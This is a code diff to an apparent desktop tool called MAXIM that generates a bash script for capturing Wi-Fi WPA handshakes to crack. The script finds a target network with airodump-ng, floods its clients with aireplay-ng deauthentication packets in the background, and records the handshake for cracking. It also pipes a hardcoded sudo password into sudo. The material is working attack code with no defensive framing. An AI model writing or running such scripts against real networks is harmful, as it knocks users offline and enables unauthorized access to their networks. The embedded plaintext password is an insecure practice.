@@ -1095,150 +1095,53 @@ class MaximWindow(QMainWindow):
         except FileNotFoundError:
             pass
 
-        # ── Single bash script — no python, no heredocs, pure bash ──
+        # ── Dead simple bash script — grep+cut, nothing fancy ──
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
-
-        lines = [
-            "#!/bin/bash",
-            "",
-            "echo '5505' | sudo -S -v 2>/dev/null",
-            "",
-            f"mkdir -p '{essid_dir}'",
-            f"rm -f '{signal_file}'",
-            "",
-            "# ── Step 1: Monitor mode ──",
-            "echo '══════════════════════════════════════════'",
-            f"echo '  HANDSHAKE CAPTURE: {essid}'",
-            "echo '══════════════════════════════════════════'",
-            "echo ''",
-            f"echo '[1/3] Enabling monitor mode on {iface}...'",
-            f"sudo ip link set {iface} down 2>/dev/null",
-            f"sudo iw dev {iface} set type monitor 2>/dev/null",
-            f"sudo ip link set {iface} up 2>/dev/null",
-            "",
-            f"MON={iface}",
-            f"if ! iw dev {iface} info 2>/dev/null | grep -qi monitor; then",
-            f"  echo '[*] iw failed, trying airmon-ng...'",
-            f"  sudo airmon-ng start {iface} 2>/dev/null",
-            "fi",
-            f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi",
-            'echo "[*] Monitor interface: $MON"',
-            "echo ''",
-            "",
-            "# ── Step 2: Scan (foreground, 25s) ──",
-            f"echo '[2/3] Scanning for: {essid}'",
-            "echo '    Live airodump-ng scan for 25 seconds...'",
-            "echo ''",
-            "",
-            "BSSID=''",
-            "CHANNEL=''",
-            "",
-            "for ATTEMPT in 1 2 3 4 5 6 7 8 9 10; do",
-            f"  rm -f {scan_file}-* 2>/dev/null",
-            "",
-            f"  sudo timeout 25 airodump-ng -w '{scan_file}' --output-format csv --write-interval 1 $MON || true",
-            "",
-            "  clear",
-            "  echo '══════════════════════════════════════════'",
-            f"  echo '  HANDSHAKE CAPTURE: {essid}'",
-            "  echo '══════════════════════════════════════════'",
-            "  echo ''",
-            "",
-            f"  if [ ! -f '{scan_file}-01.csv' ]; then",
-            "    echo '  [!] No CSV file created.'",
-            "    echo \"  Attempt $ATTEMPT/10, retrying...\"",
-            "    echo ''",
-            "    continue",
-            "  fi",
-            "",
-            "  # Parse CSV with awk — simple, no python needed",
-            "  # airodump CSV: BSSID, First, Last, channel, Speed, Privacy, ..., ESSID(field 14)",
-            "  echo '  Networks found:'",
-            "  echo '  ─────────────────────────────────────────────────────────────'",
-            "  # Display + find target — simple grep/while, no awk",
-            f"  echo '  Networks found:'",
-            f"  echo '  ─────────────────────────────────────────────────────────────'",
-            f"  while IFS=, read -r f1 f2 f3 f4 f5 f6 f7 f8 f9 f10 f11 f12 f13 f14 rest; do",
-            '    B=$(echo "$f1" | tr -d " ")',
-            "    case \"$B\" in",
-            "      [0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f])",
-            '        CH=$(echo "$f4" | tr -d " ")',
-            '        E=$(echo "$f14" | sed "s/^ *//;s/ *$//")',
-            '        PWR=$(echo "$f9" | tr -d " ")',
-            '        ENC=$(echo "$f6" | tr -d " ")',
-            '        printf "  %-34s %-18s CH:%-4s PWR:%-5s %s\\n" "$E" "$B" "$CH" "$PWR" "$ENC"',
-            "        ;;",
-            "    esac",
-            f"  done < '{scan_file}-01.csv'",
-            f"  echo '  ─────────────────────────────────────────────────────────────'",
-            "  echo ''",
-            "",
-            "  # Find target ESSID (case-insensitive)",
-            f"  while IFS=, read -r f1 f2 f3 f4 f5 f6 f7 f8 f9 f10 f11 f12 f13 f14 rest; do",
-            '    B=$(echo "$f1" | tr -d " ")',
-            "    case \"$B\" in",
-            "      [0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f]:[0-9A-Fa-f][0-9A-Fa-f])",
-            '        E=$(echo "$f14" | sed "s/^ *//;s/ *$//")',
-            '        E_LOWER=$(echo "$E" | tr "[:upper:]" "[:lower:]")',
-            f'        TARGET_LOWER=$(echo "{essid}" | tr "[:upper:]" "[:lower:]")',
-            '        if [ "$E_LOWER" = "$TARGET_LOWER" ]; then',
-            '          CH=$(echo "$f4" | tr -d " ")',
-            '          BSSID="$B"',
-            '          CHANNEL="$CH"',
-            '          ESSID_FOUND="$E"',
-            "          break",
-            "        fi",
-            "        ;;",
-            "    esac",
-            f"  done < '{scan_file}-01.csv'",
-            "",
-            "  if [ -n \"$BSSID\" ]; then",
-            "    echo \"  [*] TARGET: $ESSID_FOUND  |  BSSID: $BSSID  |  Channel: $CHANNEL\"",
-            "    echo ''",
-            "    break",
-            "  fi",
-            "",
-            "  echo \"  [*] '{essid}' not found — attempt $ATTEMPT/10, retrying...\"",
-            "  echo ''",
-            "done",
-            "",
-            f"rm -f {scan_file}-* 2>/dev/null",
-            "",
-            "if [ -z \"$BSSID\" ]; then",
-            f"  echo '[!] Could not find network: {essid}'",
-            f"  echo 'FAILED' > '{signal_file}'",
-            "  echo 'Press Enter to close'",
-            "  read",
-            "  exit 1",
-            "fi",
-            "",
-            "# ── Step 3: Capture (foreground) + Deauth (background) ──",
-            "echo ''",
-            "echo '[3/3] Capturing handshake on channel $CHANNEL...'",
-            "echo '    Target: $ESSID_FOUND ($BSSID)'",
-            "echo '    Deauth running in background.'",
-            "echo '    MAXIM will auto-detect handshake and start cracking.'",
-            "echo ''",
-            "",
-            "# Deauth in background",
-            "(",
-            "  sleep 3",
-            "  for i in $(seq 1 30); do",
-            "    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1",
-            "    sleep 4",
-            "  done",
-            ") &",
-            "",
-            "# Capture in FOREGROUND — airodump needs the terminal",
-            f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON",
-            "",
-            "echo ''",
-            "echo 'Capture stopped.'",
-            "echo 'Press Enter to close.'",
-            "read",
-        ]
-
-        script.write('\n'.join(lines) + '\n')
+        script.write("#!/bin/bash\n")
+        script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
+        script.write(f"mkdir -p '{essid_dir}'\n")
+        script.write(f"rm -f '{signal_file}'\n\n")
+        # Step 1: Monitor mode
+        script.write(f"echo '[1/3] Monitor mode on {iface}'\n")
+        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
+        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
+        script.write(f"sudo ip link set {iface} up 2>/dev/null\n")
+        script.write(f"MON={iface}\n")
+        script.write(f"if iw dev {iface}mon info >/dev/null 2>&1; then MON={iface}mon; fi\n")
+        script.write("echo \"Interface: $MON\"\necho\n\n")
+        # Step 2: Scan — use --essid filter. Any BSSID line = our target.
+        script.write(f"echo '[2/3] Scanning for {essid}...'\n")
+        script.write("BSSID=''\nCHANNEL=''\n")
+        script.write("for i in 1 2 3 4 5; do\n")
+        script.write(f"  rm -f {scan_file}-* 2>/dev/null\n")
+        script.write(f"  sudo timeout 20 airodump-ng --essid '{essid}' -w '{scan_file}' --output-format csv --write-interval 1 $MON || true\n")
+        script.write("  clear\n")
+        script.write(f"  echo 'Scanning for: {essid} (attempt '$i'/5)'\n")
+        script.write(f"  if [ -f '{scan_file}-01.csv' ]; then\n")
+        script.write(f"    LINE=$(grep -E '^[0-9A-Fa-f]{{2}}:' '{scan_file}-01.csv' | head -1)\n")
+        script.write("    if [ -n \"$LINE\" ]; then\n")
+        script.write("      BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
+        script.write("      CHANNEL=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
+        script.write("      echo \"Found: BSSID=$BSSID Channel=$CHANNEL\"\n")
+        script.write("      break\n")
+        script.write("    fi\n")
+        script.write("  fi\n")
+        script.write(f"  echo '{essid} not found yet...'\n")
+        script.write("done\n\n")
+        script.write(f"rm -f {scan_file}-* 2>/dev/null\n\n")
+        script.write("if [ -z \"$BSSID\" ]; then\n")
+        script.write(f"  echo 'Could not find {essid}'\n")
+        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
+        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
+        # Step 3: Capture foreground + deauth background
+        script.write("echo\necho '[3/3] Capturing handshake...'\n")
+        script.write("echo \"Target: $BSSID ch $CHANNEL\"\n")
+        script.write("echo 'MAXIM will auto-detect handshake and start cracking.'\necho\n\n")
+        script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
+        script.write("    sudo aireplay-ng --deauth 10 -a $BSSID $MON >/dev/null 2>&1\n")
+        script.write("    sleep 4\n  done\n) &\n\n")
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' $MON\n\n")
+        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
 
         script.close()
         os.chmod(script.name, 0o755)
